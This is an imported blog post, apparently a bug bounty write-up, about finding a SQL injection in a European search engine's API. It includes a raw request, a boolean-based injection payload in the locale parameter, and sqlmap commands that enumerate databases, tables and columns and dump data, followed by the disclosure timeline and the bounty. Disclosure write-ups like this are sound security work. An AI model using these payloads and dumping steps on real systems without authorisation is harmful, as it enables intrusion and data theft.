---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-07-11_sql-injection-bug-bounty-poc.md
original_filename: 2019-07-11_sql-injection-bug-bounty-poc.md
title: SQL Injection Bug Bounty POC!
category: documents
detected_topics:
- sqli
- command-injection
- api-security
tags:
- imported
- documents
- sqli
- command-injection
- api-security
language: en
raw_sha256: 776a3b6d326f7c5f3498e2005ea9de87c1e1dfda8de008ed78f5bd5e9dba4224
text_sha256: cf959b735f578310b37de79feeca66684e3de45cd04cec1e2eec7c3d93e24d97
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# SQL Injection Bug Bounty POC!

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-07-11_sql-injection-bug-bounty-poc.md
- Source Type: markdown
- Detected Topics: sqli, command-injection, api-security
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `776a3b6d326f7c5f3498e2005ea9de87c1e1dfda8de008ed78f5bd5e9dba4224`
- Text SHA256: `cf959b735f578310b37de79feeca66684e3de45cd04cec1e2eec7c3d93e24d97`


## Content

---
title: "SQL Injection Bug Bounty POC!"
url: "https://medium.com/@ariffadhlullah2310/sql-injection-bug-bounty-110e92e71ec3"
authors: ["Arif-ITSEC111"]
bugs: ["SQL injection"]
bounty: "5,000"
publication_date: "2019-07-11"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5158
scraped_via: "browseros"
---

# SQL Injection Bug Bounty POC!

SQL Injection Bug Bounty POC!
Arif-ITSEC111
Follow
2 min read
·
Jul 11, 2019

111

3

Good Dayyy Everyone,

in a few days ago, i try to join with a bug bounty program and i try to search the program still running and managed.

i found **** program

FYI the target is european search engine. Like google or something. i guess the target is on france

The scope is : *.xxxx.com

Ok we go to the point

i found the vulnerability is on api.xxx.com

This is the raw that i got on burp

GET /api/trend/get?locale=en_GB&device=desktop&uiv=4 HTTP/1.1
Host: api.xxxx.com
Content-Type: application/x-www-form-urlencoded
Origin: https://www.xxx.com
Connection: close
blablabla

Get Arif-ITSEC111’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

This is my payload : locale=en_GB’) AND 1234=(SELECT (CASE WHEN (1234=1234) THEN 1234 ELSE (SELECT 4376 UNION SELECT 4107) END)) — BWMI&device=desktop&uiv=4

i save the raw into the notepad as .txt format
i run my sqlmap from my terminal (because i used mac. i use this only sqlmap -r /xxx/xxx/xxx/files.txt — dbs
i got something cool stuff there i got the database
and i try to get more than the dbs. i try to check the table first using this sqlmap -r /xxx/xxx/xxx/files.txt -D xxx — table
i found a lot of table there but there is something interesting for me. Then i try to get the columns
sqlmap -r /xxx/xxx/xxx/files.txt -D xxx -T xxx — columns
i got the columns. very interesting then i try to got the field of DB
TADAAAA i GOT what i want .
Press enter or click to view image in full size
ehehehehe….
Create a report, and submit the report
- status on review, then status changed to accepted, then solved now
2 July 2019 — report
2 July 2019 — accepted
9 July 2019 — ask for verification or retest
9 July 2019 — solved
2019–07–12 13:53:51 5000EURO BOUNTY HAS COMING
Press enter or click to view image in full size
Press enter or click to view image in full size
